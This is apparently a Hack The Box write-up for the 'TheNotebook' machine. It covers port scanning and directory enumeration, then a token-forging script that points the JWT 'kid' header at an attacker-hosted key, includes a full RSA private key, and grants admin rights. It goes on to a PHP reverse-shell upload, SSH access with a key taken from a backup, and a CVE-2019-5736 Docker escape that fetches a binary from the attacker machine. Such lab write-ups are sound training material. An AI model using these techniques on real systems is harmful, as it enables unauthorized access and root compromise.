# nmap

````bash
# Nmap 7.91 scan initiated Mon Jul 12 13:41:08 2021 as: nmap -p 22,80 -sC -sV -A -vv --open -oA nmap/10.10.10.230-TheNotebook 10.10.10.230 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-07-12 13:41:08 SAST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.10.10.230
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-07-12 13:41:08 SAST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZwjrB05nGUvacI81YxNqy+6WpPHhIju6c73aoiru9nW/aVhTmOEsSOGoChEXeQeDN67ZN5QW4LFf0tXeQeJqvgO82HtFkUOiN8tt1RpI98SV+hx8scCzpmtAyu1OJSUM3/cL2tEPTcPHAgHTmroWiXxIMPhTFLIoDVBIqmBrORUIwgjIzFUbEDQJXKPkFciofbowVOkHnT+lv5XokU6571wrX/LRJvTNBEAvbbz0HAfvUkne8ycQsW08qk/BugiLnJHLg24YryGdHl5RqqW/42fsUADngFLncy2+/XCo8Pe/erO+7Zw6r4n1qVb0W0BZ+lRflcRss3diM/21R6O0z
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLeuBF/ZBUM0ZBYW4+vgQMhIPWVs2fzv9lmQHoflWFNMP/sFWZDeVneJE0CRSLnYi2y/wwc079bIsQRibay3Fpg=
|   256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDg0mzA1xTe9hivlJN4s+7eXaiyIYefpyykHIir3btEA
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZwjrB05nGUvacI81YxNqy+6WpPHhIju6c73aoiru9nW/aVhTmOEsSOGoChEXeQeDN67ZN5QW4LFf0tXeQeJqvgO82HtFkUOiN8tt1RpI98SV+hx8scCzpmtAyu1OJSUM3/cL2tEPTcPHAgHTmroWiXxIMPhTFLIoDVBIqmBrORUIwgjIzFUbEDQJXKPkFciofbowVOkHnT+lv5XokU6571wrX/LRJvTNBEAvbbz0HAfvUkne8ycQsW08qk/BugiLnJHLg24YryGdHl5RqqW/42fsUADngFLncy2+/XCo8Pe/erO+7Zw6r4n1qVb0W0BZ+lRflcRss3diM/21R6O0z
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLeuBF/ZBUM0ZBYW4+vgQMhIPWVs2fzv9lmQHoflWFNMP/sFWZDeVneJE0CRSLnYi2y/wwc079bIsQRibay3Fpg=
|   256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDg0mzA1xTe9hivlJN4s+7eXaiyIYefpyykHIir3btEA
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 12 13:41:23 2021 -- 2 IP addresses (2 hosts up) scanned in 15.16 seconds
````

## /etc/hosts entries

- thenotebook.htb
- notebook.htb

# web
## gobuster
```bash
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://thenotebook.htb
```

````bash
└─$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://thenotebook.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thenotebook.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/17 16:44:50 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://thenotebook.htb/]
/register             (Status: 200) [Size: 1422]                             
/login                (Status: 200) [Size: 1250]                             
Progress: 23980 / 30001 (79.93%)                                            [ERROR] 2021/07/17 16:54:25 [!] parse "http://thenotebook.htb/error\x1f_log": net/url: invalid control character in URL
                                                                             
===============================================================
2021/07/17 16:56:48 Finished
===============================================================
````
![](src/TheNotebook-02.png)

- ffuf did not find vhosts

## web app
### account registration
![](src/TheNotebook-01.png)
- the app allows registration
- registered with qdada : secret123
- Jason Web Token visible.


# user
## forging jwt
![](src/TheNotebook-04.png)
- the token is copied to jwt.io for analysis
- it is a kid token which can be encoded with any key, in this case it was the server's private key
- the payload indicates admin capability of 0. 
- chaning this to 1 requires a new kid token to be generated.

### generate private key
````bash
openssl genrsa -out privKey.key 2048
````

### host the private key
````bash
python3 -m http.server 7070
````

<hr>

### generate the token using the private key

````python
# gentoken.py
#
import requests
from urllib3.exceptions import InsecureRequestWarning
import time
import jwt
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
epoch = time.time()

headers = {"typ": "JWT","alg": "RS256","kid": "http://10.10.14.17:7070/privKey.key"}

payload = {"username": "qdada","email": "qdada@thenotebook.htb","admin_cap":1}

thePrivateKey = '''-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAlpLjN7erdl8YjAgDoDW4MpXZCtAUgWsiXHqtwIHTGUZTbC1J
+i9Wrquxjrt170dpyIgT0iWSrqwTYKofhFt0Yc23j5kuKc27L708llJ5cHtkaU3L
G8L8zsq96bnBS2soAyCcOX6xE//gVXrpLb1Ue6S5en3/cczMK6tM5UBwCjuTjQYv
iAtdma7AW3n2DT9YMdy5fTd9pU/xxLcKQqYujt1rUxAQiEJA2fJkJH2KZDXI3whn
1q8/ha8HuA4XDrgPoBB7eu0vx+8Fj8HZluSp0hkhb95sJ4Ckn+OC3dvpm/8ehHWX
WHVcXdXTi/pVEsBvlVVyXJ7M2uiEsv91E/r83QIDAQABAoIBAFiWpzQ6zZhhLrIE
bQ2vTWYFn6Kq9cWG4LqEOwHN4AM4yxAUPTgC7f7qaRbO1/4lh+lBllfHX1uBRg1T
SiO3Iuv/+oVz3CMgNYdK0QCoGWbCUjtaV6tHtzF7OuzuKvlSXEIqx39UOJ7JppTk
MZiFkdUE/1NAGjA8C8uNhzpCBSkfKROvzbyWbdular/DyFxIwUrg5od+6AyohTuP
89EOJCrKlrFJCEN0ma3GYb8I0aS9zxdPIu5ytT9eL697ufbUx3Uaues81mhUYUBu
XCCC9z9FsWOKfNfSEqrlthBhO/d/94UIMjdCZN0Ybn9OmroIhTT07OGaLyf0v0g2
sXozb4ECgYEAxRKfAasbFYW6nmnvpZAvoEMVI3Vu507h7rj47JXBY6mIeb4ezCF9
U2MpPM+tz4BJUsdPHkA2CQMjnluGl/uYdk1uqtqcZh4ALdGgypHKRWL0tyLguOji
YQhCV2JdLOqAAbv6bCWGUVC7lHB5H4h8xivRAghMz5Ph/6InuvhEkm0CgYEAw5jl
+zPEU3vdQDKkZ/3KfHW60N2dONhfDCrz9xSuJ+grHoSLisZ58tN741kmWxL8rPq4
umgG6XQCFu3yvSK4kU2f8vp8drehoUE7d18V5913/KnjvN6e1O86A7myd/U7SpaH
T3rfqmYgqa8aeL1F1MwSKdRLFFQNcWuTgMqdDjECgYAz3ZK7fazDHU7gIkFP8YKX
SxBlJKLrfXc4vLXGjiM3d4bTg5XXY3j4WUChIIc99SVXA91uuLd/57OYGb5ygWS+
veJCVQaUWZDyfhkzNutlF4YQLL237JKntuS+2sRq7cyCqFZf4ABZpkW362H1SpaM
ETwQrN6KQwFXpfWO34gsgQKBgGQgyFJw7KbD+L4dbpYhkF9oMSss14g7E2T6NAuf
FYwuSKyFs51l/xV0d64pe/4RWTH/40Lhb/BgR5WPV7zEonEXqLLM0ZxAYshWyWdR
ULhyYjMAkSmlWO+uSyePDzJjYmfLaRch0o+7WisjDU0Tr0TA9udc2tZcNMmEBW1f
y0hxAoGARAnheEMshhX1cRaGKDc8o9uxzTxdQUTAzSoBtdAceLYLIXzokr+JHE31
XY0awQulzYGnCoOt2cdkKA/iQ5oZBzFOzcULc1Jq0gEulAF5xyr5v7UaM+DXm3x+
jHdHYZpwotoNerS+2BoXFtPS5Ap2ZUIRdIELpKYN6zGi7ZU+fOs=
-----END RSA PRIVATE KEY-----'''



auth = jwt.encode (payload,thePrivateKey, algorithm='RS256', headers = {"kid": "http://10.10.14.17:7070/privKey.key"} )
print(auth)
````

![](src/TheNotebook-05.gif)

<hr>

### substitute token


![](src/TheNotebook-06.gif)

- at this point the pentester monkey php reverseshell is loaded to receive a reverse shell

![](src/TheNotebook-07.gif)

<hr>

## backup files

![](src/TheNotebook-08.png)

- a backup file is found on /var/backups

![](src/TheNotebook-09.png)

- extracting this backup file reveals the user noah
- also reveald is noah's <span class='redunderline'>private key</span>

<hr>

## loging on with private key
````bash
ssh -i noah_id_rsa noah@10.10.10.230
````

![](src/TheNotebook-10.png)


# root
````bash
sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
````
- a docker instance of the app webapp-dev01 can be started with  root privileges
- one can append that command with bash so that bash runs as root, inside the docker instance

## docker escape
- As Ipppsec explains ( https://youtu.be/S4FrlMTY0GY?t=2073 ), for think version of docker, there is a vulnerability that allows one to break into docker then escape it by overwriting bash on host
```bash
/usr/bin/docker -v
````
- reveals docker version 18.06.0-ce
- a docker escape POC by the researcher Nick Frichette exists (https://github.com/Frichetten/CVE-2019-5736-PoC).
- ![](src/TheNotebook-11.png)

<hr>

### install go lang

![](src/TheNotebook-12.png)
![](src/TheNotebook-13.png)

- install go lang on Kali if not already installed.

<hr>

### modify the POC
![](src/TheNotebook-14.png)

````bash
go build main.go
````
- the POC is modified and then compiled

![](src/TheNotebook-15.png)

- main has been compiled and python web server is started so as to pull the binary from the victim machine.

<HR>

### exploit overview
	
- two shells into noah are launched
- each of the shell will run docker instances at two stages
- stage 1 runs the main binary which overwrites runc on the host with the reverse shell payload
- stage 2 starts the second docker instance, thereby running runc again, executing the reverse shell.

### exploit execution

![](src/TheNotebook-16.png)

<span class="boxedpoints">[1]</span> the docker instance is started with <span class="redunderline">/bin/bash</span>
<span class="boxedpoints">[2]</span> 3 commands are executed all at once
	- the compiled binary is downloaded from Kali
	- once downloaded the binary's flag is changed to be executable
	- finally the binary is executed
<span class="boxedpoints">[3]</span> On the second portal, the command to start a docker instance with <span class="redunderline">/bin/sh</span> is standing by until the line `Overwritten /bin/sh successfully` appears. 
<span class="boxedpoints">[4]</span> Immediatley as the line in [3] appears, the docker instance is started with <span class="redunderline">/bin/sh</span>

### exploit execution animation (righ-click view image for clear view)

![](src/TheNotebook-17.gif)